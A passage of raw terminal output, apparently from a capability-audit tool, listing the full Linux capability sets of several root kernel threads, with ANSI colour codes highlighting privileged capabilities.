  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 18 (cpuhp/0) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 19 (cpuhp/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 20 (migration/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 21 (ksoftirqd/1) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 22 (kworker/1:0-cgroup_free) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 23 (kworker/1:0H-events_highpri) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 26 (kdevtmpfs) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 27 (inet_frag_wq) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 28 (kauditd) user=root
  CapInh: 0x0000000000000000=
